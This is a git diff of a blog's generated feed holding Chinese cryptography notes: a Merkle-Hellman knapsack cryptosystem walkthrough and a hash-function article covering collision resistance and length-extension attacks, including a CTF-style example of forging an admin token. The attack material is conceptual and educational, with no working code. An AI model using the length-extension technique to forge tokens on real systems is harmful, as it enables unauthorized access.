-<p>AEAD 的特点是同时提供加密和认证。也就是说，它既保证内容不可读，也能发现数据是否被篡改。</p>
-<h2 id="TLS-1-2-和-TLS-1-3"><a href="#TLS-1-2-和-TLS-1-3" class="headerlink" title="TLS 1.2 和 TLS 1.3"></a>TLS 1.2 和 TLS 1.3</h2><p>TLS 1.3 相比 TLS 1.2 做了很多减法。</p>
-<p><img src="/images/TLS1.3vsTLS1.2.png" alt="TLS1.3-vs-TLS1.2"></p>
-<p>主要区别包括：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+m &amp;gt; \sum_{i=1}^{n} w_i
+\]</div>
+
+</div>
+
+
+
 <ul>
-<li>握手轮次更少</li>
-<li>删除 RSA 密钥交换</li>
-<li>删除 CBC 等旧算法</li>
-<li>默认使用前向安全的密钥交换</li>
-<li>握手阶段更多内容被加密保护</li>
+<li>再选取整数 <span class="math-inline">(r)</span>，使得</li>
 </ul>
-<p>TLS 1.2 仍然支持很多历史算法，因此兼容性更强，但协议复杂度也更高。TLS 1.3 则更像一次清理：把容易出问题的旧东西去掉，只保留更现代的方案。</p>
-<h2 id="OpenSSL-查看证书"><a href="#OpenSSL-查看证书" class="headerlink" title="OpenSSL 查看证书"></a>OpenSSL 查看证书</h2><p>可以用下面命令查看一个网站的证书和握手信息：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl s_client -connect example.com:443 -servername example.com</span><br></pre></td></tr></table></figure>
+<div class="math-display">
 
-<p>其中 <code>-connect</code> 指定连接地址，<code>-servername</code> 用来发送 SNI。现在很多服务器会根据 SNI 返回不同证书，所以一般要带上。</p>
-<p>如果只想看证书链，可以这样：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl s_client -connect example.com:443 -servername example.com -showcerts</span><br></pre></td></tr></table></figure>
+<div class="math-display">\[
+\gcd(r,m)=1
+\]</div>
 
+</div>
+
+
+
+<p>然后构造公开序列：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+a_i \equiv r w_i \pmod m
+\]</div>
+
+</div>
+
+
+
+<p>此时：</p>
+<ul>
+<li><span class="math-inline">(w_i)</span> 是私钥中的结构化序列</li>
+<li><span class="math-inline">(a_i)</span> 是公开发布的背包序列</li>
+</ul>
+<h3 id="5-1-加密"><a href="#5-1-加密" class="headerlink" title="5.1 加密"></a>5.1 加密</h3><p>对明文比特串 <span class="math-inline">(x_1,\dots,x_n)</span>，密文为：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+C = \sum_{i=1}^{n} x_i a_i
+\]</div>
+
+</div>
+
+
+
+<h3 id="5-2-解密"><a href="#5-2-解密" class="headerlink" title="5.2 解密"></a>5.2 解密</h3><p>解密时，先利用 <span class="math-inline">(r)</span> 的模逆：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+r^{-1} \pmod m
+\]</div>
+
+</div>
+
+
+
+<p>将密文恢复到私钥背包对应的形式：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+C' \equiv C \cdot r^{-1} \pmod m
+\]</div>
+
+</div>
+
+
+
+<p>然后对超递增序列 <span class="math-inline">(w_i)</span> 使用贪心算法恢复明文。</p>
+<h2 id="6-Merkle-Hellman-背包密码体制"><a href="#6-Merkle-Hellman-背包密码体制" class="headerlink" title="6. Merkle-Hellman 背包密码体制"></a>6. Merkle-Hellman 背包密码体制</h2><p>最著名的背包公钥密码体制是 <strong>Merkle-Hellman Knapsack Cryptosystem</strong>。其核心思路就是：</p>
+<ol>
+<li>选一个超递增序列作为私钥</li>
+<li>通过模乘变换生成看似随机的公开序列</li>
+<li>用公开序列加密</li>
+<li>用私钥结构高效解密</li>
+</ol>
+<p>这种设计在早期被认为很有希望，因为公开背包看起来像一个一般的 NP 难问题实例。</p>
+<h2 id="7-一个简单例子"><a href="#7-一个简单例子" class="headerlink" title="7. 一个简单例子"></a>7. 一个简单例子</h2><p>假设私钥超递增序列为：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+W = (2,3,7,14,30)
+\]</div>
+
+</div>
+
+
+
+<p>选择模数和乘数：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+m = 61, \quad r = 17
+\]</div>
+
+</div>
+
+
+
+<p>则公开序列为：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+A_i \equiv 17W_i \pmod{61}
+\]</div>
+
+</div>
+
+
+
+<p>即：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+A = (34, 51, 58, 55, 22)
+\]</div>
+
+</div>
+
+
+
+<p>若明文比特串为：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+X = (1,0,1,0,1)
+\]</div>
+
+</div>
+
+
+
+<p>则密文为：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+C = 34 + 58 + 22 = 114
+\]</div>
+
+</div>
+
+
+
+<p>解密时，先计算：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+r^{-1} \pmod{61} = 18
+\]</div>
+
+</div>
+
+
+
+<p>然后：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+C' \equiv 114 \cdot 18 \pmod{61} \equiv 39
+\]</div>
+
+</div>
+
+
+
+<p>注意到：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+39 = 2 + 7 + 30
+\]</div>
+
+</div>
+
+
+
+<p>因此对应的明文比特串正是 <span class="math-inline">(X &#x3D; (1,0,1,0,1))</span>。</p>
+<p>再用超递增序列 <span class="math-inline">(W)</span> 做贪心分解：</p>
+<ul>
+<li><span class="math-inline">(39 \ge 30)</span>，第 5 位为 1，剩余 <span class="math-inline">(9)</span></li>
+<li><span class="math-inline">(9 &lt; 14)</span>，第 4 位为 0</li>
+<li><span class="math-inline">(9 \ge 7)</span>，第 3 位为 1，剩余 <span class="math-inline">(2)</span></li>
+<li><span class="math-inline">(2 &lt; 3)</span>，第 2 位为 0</li>
+<li><span class="math-inline">(2 \ge 2)</span>，第 1 位为 1，剩余 <span class="math-inline">(0)</span></li>
+</ul>
+<p>由此恢复出原始比特串。</p>
+<p>这个例子中，公开序列和私钥序列之间的对应关系是严格一致的，因此加密和解密过程可以完整闭合。</p>
+<h2 id="8-安全性问题"><a href="#8-安全性问题" class="headerlink" title="8. 安全性问题"></a>8. 安全性问题</h2><p>背包密码体制曾经受到过较多研究，但后来发现许多早期方案存在明显缺陷，尤其是 Merkle-Hellman 方案。其主要问题包括：</p>
+<ul>
+<li>公开背包与私钥结构之间关系过于简单</li>
+<li>公开序列可能被格基方法分析</li>
+<li>某些参数选择下容易被还原出私钥结构</li>
+</ul>
+<p>因此，经典背包密码体制并没有像 RSA 那样长期成为主流公钥算法。</p>
+<h2 id="9-背包密码与格攻击"><a href="#9-背包密码与格攻击" class="headerlink" title="9. 背包密码与格攻击"></a>9. 背包密码与格攻击</h2><p>公开背包问题虽然表面上看像 NP 难问题，但如果参数设计不当，往往会暴露额外结构。例如：</p>
+<ul>
+<li>序列具有近似超递增特征</li>
+<li>模数和乘数选择不理想</li>
+<li>公开向量之间存在可利用关系</li>
+</ul>
+<p>这类结构可以被格方法利用，从而恢复原始私钥或明文。</p>
+<h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h2><p>背包密码体制的核心思路是将明文编码为若干二进制系数，再通过权重求和形成密文。它的关键点在于：</p>
+<ul>
+<li>一般背包问题求解困难</li>
+<li>超递增序列可以高效解密</li>
+<li>公钥方案需要对私钥结构进行隐藏</li>
+<li>经典方案存在较明显的安全缺陷</li>
+</ul>
+<p>因此，背包密码体制更适合作为密码学发展史中的重要实例来理解，而不是现代主流加密方案。</p>
+]]></content>
+      <categories>
+        <category>密码学</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hash</title>
+    <url>/2026/03/19/%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h1><p>哈希函数（Hash function）又称散列函数，是一种把任意长度输入映射为固定长度输出的函数。这个输出通常叫做<strong>消息摘要</strong>（message digest）或哈希值（hash value）。它的核心作用不是“加密”，而是用于<strong>完整性校验、数据索引、数字签名、口令存储</strong>等场景。</p>
+<span id="more"></span>
+
+<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>可以把哈希函数理解为“压缩摘要器”:</p>
+<div class="math-display">
+
+<div class="math-display">\[
+H(m) = h
+\]</div>
+
+</div>
+
+
+
+<p>其中，<span class="math-inline">(m)</span> 是任意长度的消息，<span class="math-inline">(h)</span> 是固定长度的摘要。</p>
+<p>哈希函数最重要的特点是：</p>
+<ul>
+<li>输入相同，输出必然相同</li>
+<li>输入发生微小变化，输出会剧烈变化</li>
+<li>不能从摘要直接反推出原文</li>
+</ul>
+<p>这也是为什么哈希常被用来存储密码：数据库里通常不会直接保存明文密码，而是保存密码的哈希值。</p>
+<h2 id="安全性性质"><a href="#安全性性质" class="headerlink" title="安全性性质"></a>安全性性质</h2><p>一个好的密码学哈希函数通常需要满足以下性质：</p>
+<h3 id="1-确定性"><a href="#1-确定性" class="headerlink" title="1. 确定性"></a>1. 确定性</h3><p>同一个输入，哈希结果必须始终一致。</p>
+<h3 id="2-抗原像性"><a href="#2-抗原像性" class="headerlink" title="2. 抗原像性"></a>2. 抗原像性</h3><p>给定摘要 <span class="math-inline">(h)</span>，很难找到消息 <span class="math-inline">(m)</span> 使得：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+H(m)=h
+\]</div>
+
+</div>
+
+
+
+<h3 id="3-抗第二原像性"><a href="#3-抗第二原像性" class="headerlink" title="3. 抗第二原像性"></a>3. 抗第二原像性</h3><p>给定消息 <span class="math-inline">(m_1)</span>，很难找到另一个不同消息 <span class="math-inline">(m_2)</span> 使得：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+H(m_1)=H(m_2)
+\]</div>
+
+</div>
+
+
+
+<h3 id="4-抗碰撞性"><a href="#4-抗碰撞性" class="headerlink" title="4. 抗碰撞性"></a>4. 抗碰撞性</h3><p>很难找到任意两条不同消息 <span class="math-inline">(m_1,m_2)</span>，使得：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+H(m_1)=H(m_2)
+\]</div>
+
+</div>
+
+
+
+<p>注意，从数学上讲，碰撞一定存在，因为输入空间无限大而输出空间有限；安全性要求的是<strong>在计算上不可行</strong>。</p>
+<h2 id="常见哈希算法"><a href="#常见哈希算法" class="headerlink" title="常见哈希算法"></a>常见哈希算法</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><ul>
+<li>输出 128 bit</li>
+<li>曾经使用广泛</li>
+<li>现在已经不再安全</li>
+<li>常用于旧系统兼容、文件校验、口令摘要</li>
+</ul>
+<h3 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h3><ul>
+<li>输出 160 bit</li>
+<li>已被证明存在实用碰撞攻击</li>
+<li>实际安全场景中已逐渐淘汰</li>
+</ul>
+<h3 id="SHA-2"><a href="#SHA-2" class="headerlink" title="SHA-2"></a>SHA-2</h3><ul>
+<li>包括 SHA-224、SHA-256、SHA-384、SHA-512 等</li>
+<li>至今仍然广泛使用</li>
+<li>在大多数场景下安全性较好</li>
+</ul>
+<h3 id="SHA-3"><a href="#SHA-3" class="headerlink" title="SHA-3"></a>SHA-3</h3><ul>
+<li>基于不同于 SHA-1 &#x2F; SHA-2 的结构设计</li>
+<li>适合作为长期替代方案</li>
+</ul>
+<h2 id="哈希的典型用途"><a href="#哈希的典型用途" class="headerlink" title="哈希的典型用途"></a>哈希的典型用途</h2><h3 id="1-完整性校验"><a href="#1-完整性校验" class="headerlink" title="1. 完整性校验"></a>1. 完整性校验</h3><p>当你下载一个文件时，网站通常会同时给出一个 SHA-256 值。你下载后重新计算哈希，如果结果一致，说明文件大概率没有被篡改。</p>
+<h3 id="2-密码存储"><a href="#2-密码存储" class="headerlink" title="2. 密码存储"></a>2. 密码存储</h3><p>数据库不会直接保存密码明文，而是保存：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+H(\text{password})
+\]</div>
+
+</div>
+
+
+
+<p>实际工程中还会加入 <strong>salt</strong>，防止彩虹表攻击。</p>
+<h3 id="3-数字签名"><a href="#3-数字签名" class="headerlink" title="3. 数字签名"></a>3. 数字签名</h3><p>对大消息直接做签名代价较高，因此常先对消息哈希，再对摘要签名。</p>
+<h3 id="4-认证与令牌"><a href="#4-认证与令牌" class="headerlink" title="4. 认证与令牌"></a>4. 认证与令牌</h3><p>很多接口会把哈希当作 token、签名或校验值使用，例如：</p>
+<ul>
+<li><code>token = MD5(secret || user_id || ts)</code></li>
+<li><code>sign = SHA256(data || key)</code></li>
+<li><code>verify = SHA1(message)</code></li>
+</ul>
+<p>这类设计如果处理不当，容易引入绕过或伪造风险。</p>
+<h2 id="常见使用场景"><a href="#常见使用场景" class="headerlink" title="常见使用场景"></a>常见使用场景</h2><h3 id="1-消息完整性校验"><a href="#1-消息完整性校验" class="headerlink" title="1. 消息完整性校验"></a>1. 消息完整性校验</h3><p>哈希函数常用于验证消息是否被篡改。给定消息 <span class="math-inline">(m)</span>，计算摘要 <span class="math-inline">(H(m))</span> 后，可以在传输前后比较摘要是否一致。如果两次摘要相同，则说明消息在传输过程中保持不变的概率很高。</p>
+<h3 id="2-口令存储"><a href="#2-口令存储" class="headerlink" title="2. 口令存储"></a>2. 口令存储</h3><p>系统通常不会直接保存明文口令，而是保存口令的哈希值：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+H(\text{password})
+\]</div>
+
+</div>
+
+
+
+<p>为了抵抗预计算攻击，实际应用中还会引入随机盐值 <span class="math-inline">(salt)</span>，保存形式通常写成：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+H(\text{salt} || \text{password})
+\]</div>
+
+</div>
+
+
+
+<h3 id="3-数字签名-1"><a href="#3-数字签名-1" class="headerlink" title="3. 数字签名"></a>3. 数字签名</h3><p>哈希函数常作为签名算法的输入预处理步骤。由于直接对长消息进行签名开销较高，因此通常先计算消息摘要，再对摘要签名。</p>
+<h3 id="4-消息认证码与令牌"><a href="#4-消息认证码与令牌" class="headerlink" title="4. 消息认证码与令牌"></a>4. 消息认证码与令牌</h3><p>在协议设计中，哈希函数有时与密钥结合使用，构造消息认证码或令牌校验值。若拼接顺序、长度处理或密钥管理不当，可能引入安全问题。</p>
+<h2 id="典型分析方法"><a href="#典型分析方法" class="headerlink" title="典型分析方法"></a>典型分析方法</h2><p>当面对一个哈希值或哈希流程时，通常需要先判断它属于哪一类问题：</p>
+<h3 id="1-已知摘要求原文"><a href="#1-已知摘要求原文" class="headerlink" title="1. 已知摘要求原文"></a>1. 已知摘要求原文</h3><p>如果只给出固定长度摘要，而原文空间较小或格式可预测，可以通过字典、规则或枚举方式恢复原文。此时关键在于缩小搜索空间，而不是试图“逆向”哈希函数本身。</p>
+<h3 id="2-已知格式求摘要"><a href="#2-已知格式求摘要" class="headerlink" title="2. 已知格式求摘要"></a>2. 已知格式求摘要</h3><p>如果原文结构已知，只是其中某一部分未知，例如：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+H(\text{prefix} || x || \text{suffix})
+\]</div>
+
+</div>
+
+
+
+<p>那么可以通过爆破未知部分来匹配目标摘要。具体能否成功，取决于未知部分的长度和字符集大小。</p>
+<h3 id="3-校验逻辑分析"><a href="#3-校验逻辑分析" class="headerlink" title="3. 校验逻辑分析"></a>3. 校验逻辑分析</h3><p>若程序中出现类似：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+\text{sign} = H(a || b || c)
+\]</div>
+
+</div>
+
+
+
+<p>就需要重点分析各字段是否可控、拼接顺序是否固定、是否存在长度扩展风险，以及是否对输入做了规范化处理。</p>
+<h3 id="4-自定义哈希函数"><a href="#4-自定义哈希函数" class="headerlink" title="4. 自定义哈希函数"></a>4. 自定义哈希函数</h3><p>如果使用的不是标准 MD5、SHA-1 或 SHA-2，而是自定义混合过程，则需要分析其状态更新方式、循环结构、取模范围和最终输出方式。对这类函数，真正重要的是代码逻辑，而不是哈希名称。</p>
+<h2 id="长度扩展问题"><a href="#长度扩展问题" class="headerlink" title="长度扩展问题"></a>长度扩展问题</h2><p>对于基于 Merkle-Damgård 结构的哈希函数，如果应用方式不当，可能受到长度扩展攻击。典型形式是：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+\text{token} = H(\text{secret} || m)
+\]</div>
+
+</div>
+
+
+
+<p>攻击者在已知 <span class="math-inline">(H(\text{secret} || m))</span> 和消息长度信息的前提下，可能构造出新的合法摘要：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+H(\text{secret} || m || \text{padding} || m')
+\]</div>
+
+</div>
+
+
+
+<p>这并不意味着哈希函数本身“不安全”，而是说明其使用方式必须正确。</p>
+<h2 id="哈希在密码学中的角色"><a href="#哈希在密码学中的角色" class="headerlink" title="哈希在密码学中的角色"></a>哈希在密码学中的角色</h2><p>哈希函数本身不是加密算法，但它是很多密码学协议的基础组件。比如：</p>
+<ul>
+<li>RSA 签名通常先对消息哈希</li>
+<li>TLS 协议中会用哈希构造握手摘要</li>
+<li>区块链中会用哈希链接区块</li>
+<li>口令系统里用哈希保存密码</li>
+</ul>
+<p>因此，哈希函数虽然结构简单，但在安全体系中非常关键。</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>哈希函数最重要的不是“把内容变短”，而是让输入和输出之间形成一种<strong>难以逆推、难以伪造、难以碰撞</strong>的关系。理解其性质、适用场景以及常见风险，比记住某个具体算法的名称更重要。</p>
+<h2 id="长度扩展示意"><a href="#长度扩展示意" class="headerlink" title="长度扩展示意"></a>长度扩展示意</h2><p>如果一个系统把消息写成：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+\text{token} = H(\text{secret} || m)
+\]</div>
+
+</div>
+
+
+
+<p>那么攻击者在不知道 <code>secret</code> 的情况下，也可能构造：</p>
+<div class="math-display">
+
+<div class="math-display">\[
+H(\text{secret} || m || \text{padding} || m')
+\]</div>
+
+</div>
+
+
+
+<p>这就是长度扩展攻击的核心思想。</p>
+<h3 id="一个更具体的题面例子"><a href="#一个更具体的题面例子" class="headerlink" title="一个更具体的题面例子"></a>一个更具体的题面例子</h3><p>题目可能会给出：</p>
+<ul>
+<li>原消息：<code>username=admin</code></li>
+<li>原摘要：<code>SHA1(secret || username=admin)</code></li>
+<li>目标：伪造出 <code>username=admin&amp;role=1</code></li>
+</ul>
+<p>如果已知 <code>secret</code> 长度范围，就可以利用长度扩展把新的参数附加进去，同时构造新的合法摘要。</p>
+<h2 id="哈希在密码学中的角色-1"><a href="#哈希在密码学中的角色-1" class="headerlink" title="哈希在密码学中的角色"></a>哈希在密码学中的角色</h2><p>哈希函数本身不是加密算法，但它是很多密码学协议的基础组件。比如：</p>
+<ul>
+<li>RSA 签名通常先对消息哈希</li>
+<li>TLS 协议中会用哈希构造握手摘要</li>
+<li>区块链中会用哈希链接区块</li>
+<li>口令系统里用哈希保存密码</li>
+</ul>
+<p>因此，哈希函数虽然结构简单，但在安全体系中非常关键。</p>
 ]]></content>
       <categories>
         <category>密码学</category>
@@ -4108,238 +4340,6 @@ b_1^*,b_2^*,\dots,b_n^*
 <p>很多实际流程会先用 LLL 做预处理，再用 BKZ 做更深层的约简。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>格可以看成由整数线性组合生成的离散点集，基只是描述这个点集的一种方式。</p>
 <p>格密码里很多问题都会转化为短向量问题，而 LLL 和 BKZ 的作用就是把一组不好的基变得更容易暴露短向量结构。</p>
-]]></content>
-      <categories>
-        <category>密码学</category>
-      </categories>
-      <tags>
-        <tag>密码学</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hash</title>
-    <url>/2026/03/19/%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h1><p>哈希函数（Hash function）又称散列函数，是一种把任意长度输入映射为固定长度输出的函数。这个输出通常叫做<strong>消息摘要</strong>（message digest）或哈希值（hash value）。它的核心作用不是“加密”，而是用于<strong>完整性校验、数据索引、数字签名、口令存储</strong>等场景。</p>
-<span id="more"></span>
-
-<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>可以把哈希函数理解为“压缩摘要器”:</p>
-<div class="math-display">
-
-<div class="math-display">\[
-H(m) = h
-\]</div>
-
-</div>
-
-
-
-<p>其中，<span class="math-inline">(m)</span> 是任意长度的消息，<span class="math-inline">(h)</span> 是固定长度的摘要。</p>
-<p>哈希函数最重要的特点是：</p>
-<ul>
-<li>输入相同，输出必然相同</li>
-<li>输入发生微小变化，输出会剧烈变化</li>
-<li>不能从摘要直接反推出原文</li>
-</ul>
-<p>这也是为什么哈希常被用来存储密码：数据库里通常不会直接保存明文密码，而是保存密码的哈希值。</p>
-<h2 id="安全性性质"><a href="#安全性性质" class="headerlink" title="安全性性质"></a>安全性性质</h2><p>一个好的密码学哈希函数通常需要满足以下性质：</p>
-<h3 id="1-确定性"><a href="#1-确定性" class="headerlink" title="1. 确定性"></a>1. 确定性</h3><p>同一个输入，哈希结果必须始终一致。</p>
-<h3 id="2-抗原像性"><a href="#2-抗原像性" class="headerlink" title="2. 抗原像性"></a>2. 抗原像性</h3><p>给定摘要 <span class="math-inline">(h)</span>，很难找到消息 <span class="math-inline">(m)</span> 使得：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-H(m)=h
-\]</div>
-
-</div>
-
-
-
-<h3 id="3-抗第二原像性"><a href="#3-抗第二原像性" class="headerlink" title="3. 抗第二原像性"></a>3. 抗第二原像性</h3><p>给定消息 <span class="math-inline">(m_1)</span>，很难找到另一个不同消息 <span class="math-inline">(m_2)</span> 使得：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-H(m_1)=H(m_2)
-\]</div>
-
-</div>
-
-
-
-<h3 id="4-抗碰撞性"><a href="#4-抗碰撞性" class="headerlink" title="4. 抗碰撞性"></a>4. 抗碰撞性</h3><p>很难找到任意两条不同消息 <span class="math-inline">(m_1,m_2)</span>，使得：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-H(m_1)=H(m_2)
-\]</div>
-
-</div>
-
-
-
-<p>注意，从数学上讲，碰撞一定存在，因为输入空间无限大而输出空间有限；安全性要求的是<strong>在计算上不可行</strong>。</p>
-<h2 id="常见哈希算法"><a href="#常见哈希算法" class="headerlink" title="常见哈希算法"></a>常见哈希算法</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><ul>
-<li>输出 128 bit</li>
-<li>曾经使用广泛</li>
-<li>现在已经不再安全</li>
-<li>常用于旧系统兼容、文件校验、口令摘要</li>
-</ul>
-<h3 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h3><ul>
-<li>输出 160 bit</li>
-<li>已被证明存在实用碰撞攻击</li>
-<li>实际安全场景中已逐渐淘汰</li>
-</ul>
-<h3 id="SHA-2"><a href="#SHA-2" class="headerlink" title="SHA-2"></a>SHA-2</h3><ul>
-<li>包括 SHA-224、SHA-256、SHA-384、SHA-512 等</li>
-<li>至今仍然广泛使用</li>
-<li>在大多数场景下安全性较好</li>
-</ul>
-<h3 id="SHA-3"><a href="#SHA-3" class="headerlink" title="SHA-3"></a>SHA-3</h3><ul>
-<li>基于不同于 SHA-1 &#x2F; SHA-2 的结构设计</li>
-<li>适合作为长期替代方案</li>
-</ul>
-<h2 id="哈希的典型用途"><a href="#哈希的典型用途" class="headerlink" title="哈希的典型用途"></a>哈希的典型用途</h2><h3 id="1-完整性校验"><a href="#1-完整性校验" class="headerlink" title="1. 完整性校验"></a>1. 完整性校验</h3><p>当你下载一个文件时，网站通常会同时给出一个 SHA-256 值。你下载后重新计算哈希，如果结果一致，说明文件大概率没有被篡改。</p>
-<h3 id="2-密码存储"><a href="#2-密码存储" class="headerlink" title="2. 密码存储"></a>2. 密码存储</h3><p>数据库不会直接保存密码明文，而是保存：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-H(\text{password})
-\]</div>
-
-</div>
-
-
-
-<p>实际工程中还会加入 <strong>salt</strong>，防止彩虹表攻击。</p>
-<h3 id="3-数字签名"><a href="#3-数字签名" class="headerlink" title="3. 数字签名"></a>3. 数字签名</h3><p>对大消息直接做签名代价较高，因此常先对消息哈希，再对摘要签名。</p>
-<h3 id="4-认证与令牌"><a href="#4-认证与令牌" class="headerlink" title="4. 认证与令牌"></a>4. 认证与令牌</h3><p>很多接口会把哈希当作 token、签名或校验值使用，例如：</p>
-<ul>
-<li><code>token = MD5(secret || user_id || ts)</code></li>
-<li><code>sign = SHA256(data || key)</code></li>
-<li><code>verify = SHA1(message)</code></li>
-</ul>
-<p>这类设计如果处理不当，容易引入绕过或伪造风险。</p>
-<h2 id="常见使用场景"><a href="#常见使用场景" class="headerlink" title="常见使用场景"></a>常见使用场景</h2><h3 id="1-消息完整性校验"><a href="#1-消息完整性校验" class="headerlink" title="1. 消息完整性校验"></a>1. 消息完整性校验</h3><p>哈希函数常用于验证消息是否被篡改。给定消息 <span class="math-inline">(m)</span>，计算摘要 <span class="math-inline">(H(m))</span> 后，可以在传输前后比较摘要是否一致。如果两次摘要相同，则说明消息在传输过程中保持不变的概率很高。</p>
-<h3 id="2-口令存储"><a href="#2-口令存储" class="headerlink" title="2. 口令存储"></a>2. 口令存储</h3><p>系统通常不会直接保存明文口令，而是保存口令的哈希值：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-H(\text{password})
-\]</div>
-
-</div>
-
-
-
-<p>为了抵抗预计算攻击，实际应用中还会引入随机盐值 <span class="math-inline">(salt)</span>，保存形式通常写成：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-H(\text{salt} || \text{password})
-\]</div>
-
-</div>
-
-
-
-<h3 id="3-数字签名-1"><a href="#3-数字签名-1" class="headerlink" title="3. 数字签名"></a>3. 数字签名</h3><p>哈希函数常作为签名算法的输入预处理步骤。由于直接对长消息进行签名开销较高，因此通常先计算消息摘要，再对摘要签名。</p>
-<h3 id="4-消息认证码与令牌"><a href="#4-消息认证码与令牌" class="headerlink" title="4. 消息认证码与令牌"></a>4. 消息认证码与令牌</h3><p>在协议设计中，哈希函数有时与密钥结合使用，构造消息认证码或令牌校验值。若拼接顺序、长度处理或密钥管理不当，可能引入安全问题。</p>
-<h2 id="典型分析方法"><a href="#典型分析方法" class="headerlink" title="典型分析方法"></a>典型分析方法</h2><p>当面对一个哈希值或哈希流程时，通常需要先判断它属于哪一类问题：</p>
-<h3 id="1-已知摘要求原文"><a href="#1-已知摘要求原文" class="headerlink" title="1. 已知摘要求原文"></a>1. 已知摘要求原文</h3><p>如果只给出固定长度摘要，而原文空间较小或格式可预测，可以通过字典、规则或枚举方式恢复原文。此时关键在于缩小搜索空间，而不是试图“逆向”哈希函数本身。</p>
-<h3 id="2-已知格式求摘要"><a href="#2-已知格式求摘要" class="headerlink" title="2. 已知格式求摘要"></a>2. 已知格式求摘要</h3><p>如果原文结构已知，只是其中某一部分未知，例如：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-H(\text{prefix} || x || \text{suffix})
-\]</div>
-
-</div>
-
-
-
-<p>那么可以通过爆破未知部分来匹配目标摘要。具体能否成功，取决于未知部分的长度和字符集大小。</p>
-<h3 id="3-校验逻辑分析"><a href="#3-校验逻辑分析" class="headerlink" title="3. 校验逻辑分析"></a>3. 校验逻辑分析</h3><p>若程序中出现类似：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-\text{sign} = H(a || b || c)
-\]</div>
-
-</div>
-
-
-
-<p>就需要重点分析各字段是否可控、拼接顺序是否固定、是否存在长度扩展风险，以及是否对输入做了规范化处理。</p>
-<h3 id="4-自定义哈希函数"><a href="#4-自定义哈希函数" class="headerlink" title="4. 自定义哈希函数"></a>4. 自定义哈希函数</h3><p>如果使用的不是标准 MD5、SHA-1 或 SHA-2，而是自定义混合过程，则需要分析其状态更新方式、循环结构、取模范围和最终输出方式。对这类函数，真正重要的是代码逻辑，而不是哈希名称。</p>
-<h2 id="长度扩展问题"><a href="#长度扩展问题" class="headerlink" title="长度扩展问题"></a>长度扩展问题</h2><p>对于基于 Merkle-Damgård 结构的哈希函数，如果应用方式不当，可能受到长度扩展攻击。典型形式是：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-\text{token} = H(\text{secret} || m)
-\]</div>
-
-</div>
-
-
-
-<p>攻击者在已知 <span class="math-inline">(H(\text{secret} || m))</span> 和消息长度信息的前提下，可能构造出新的合法摘要：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-H(\text{secret} || m || \text{padding} || m')
-\]</div>
-
-</div>
-
-
-
-<p>这并不意味着哈希函数本身“不安全”，而是说明其使用方式必须正确。</p>
-<h2 id="哈希在密码学中的角色"><a href="#哈希在密码学中的角色" class="headerlink" title="哈希在密码学中的角色"></a>哈希在密码学中的角色</h2><p>哈希函数本身不是加密算法，但它是很多密码学协议的基础组件。比如：</p>
-<ul>
-<li>RSA 签名通常先对消息哈希</li>
-<li>TLS 协议中会用哈希构造握手摘要</li>
-<li>区块链中会用哈希链接区块</li>
-<li>口令系统里用哈希保存密码</li>
-</ul>
-<p>因此，哈希函数虽然结构简单，但在安全体系中非常关键。</p>
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>哈希函数最重要的不是“把内容变短”，而是让输入和输出之间形成一种<strong>难以逆推、难以伪造、难以碰撞</strong>的关系。理解其性质、适用场景以及常见风险，比记住某个具体算法的名称更重要。</p>
